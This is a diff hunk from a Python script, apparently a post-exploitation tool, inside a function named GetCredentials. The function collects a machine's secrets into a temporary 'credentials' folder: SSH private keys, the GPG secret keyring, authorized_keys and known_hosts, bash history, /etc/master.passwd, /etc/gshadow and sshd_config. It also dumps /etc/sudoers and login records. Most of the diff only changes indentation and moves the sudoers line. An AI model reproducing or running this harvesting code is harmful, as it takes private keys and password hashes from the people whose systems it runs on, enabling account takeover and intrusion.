@@ -205,29 +205,29 @@ def GetCredentials():
        content = content + '\n' + open(f).read()
     open('SSH_Locations.txt','wb').write(content)
     os.system("rm ssh_locations.txt ssh_contents.txt")
+    os.system("cat /etc/sudoers > sudoers.txt")
 
     if os.path.isfile("/etc/master.passwd") is True:
-        shutil.copy2("/etc/master.passwd", Temp_Dir+"/credentials/")
-    os.system('cat /etc/sudoers > sudoers.txt')
+         shutil.copy2("/etc/master.passwd", Temp_Dir+"/credentials/")
     if os.path.isfile("/etc/ssh/sshd_config") is True:
-        shutil.copy2("/etc/ssh/sshd_config", Temp_Dir+"/credentials/") 
+         shutil.copy2("/etc/ssh/sshd_config", Temp_Dir+"/credentials/") 
     if os.path.isfile(Home_Dir+'/.ssh/id_dsa') is True:
-        shutil.copy2(Home_Dir+'/.ssh/id_dsa', Temp_Dir+"/credentials/")
+         shutil.copy2(Home_Dir+'/.ssh/id_dsa', Temp_Dir+"/credentials/")
     if os.path.isfile(Home_Dir+'/.ssh/id_dsa.pub') is True:
-        shutil.copy2(Home_Dir+'/.ssh/id_dsa.pub', Temp_Dir+"/credentials/")
+         shutil.copy2(Home_Dir+'/.ssh/id_dsa.pub', Temp_Dir+"/credentials/")
     if os.path.isfile(Home_Dir+'/.ssh/id_rsa') is True:
          shutil.copy2(Home_Dir+'/.ssh/id_rsa', Temp_Dir+"/credentials/")
     if os.path.isfile(Home_Dir+'/.ssh/id_rsa.pub') is True: 
          shutil.copy2(Home_Dir+'/.ssh/id_rsa.pub', Temp_Dir+"/credentials/")
     if os.path.isfile(Home_Dir+'/.gnupg/secring.gpg') is True:
-           shutil.copy2(Home_Dir+'/.gnupg/secring.gpg', Temp_Dir+"/credentials/")
+         shutil.copy2(Home_Dir+'/.gnupg/secring.gpg', Temp_Dir+"/credentials/")
     if os.path.isfile(Home_Dir+"/.ssh/authorized_keys") is True:
-           shutil.copy2(Home_Dir+'/.ssh/authorized_keys', Temp_Dir+"/credentials/")  
+         shutil.copy2(Home_Dir+'/.ssh/authorized_keys', Temp_Dir+"/credentials/")  
     if os.path.isfile(Home_Dir+"/.ssh/known_hosts") is True:               
-          shutil.copy2(Home_Dir+'/.ssh/known_hosts', Temp_Dir+"/credentials/")
+         shutil.copy2(Home_Dir+'/.ssh/known_hosts', Temp_Dir+"/credentials/")
     shutil.copy2(Home_Dir+'/.bash_history', Temp_Dir+"/credentials/bash_history.txt")
     if os.path.isfile("/etc/gshadow") is True:
-        shutil.copy2("/etc/gshadow", Temp_Dir+"/credentials/")
+         shutil.copy2("/etc/gshadow", Temp_Dir+"/credentials/")
 
     os.system("lastlog > lastlog.txt")
     os.system("last > last.txt")
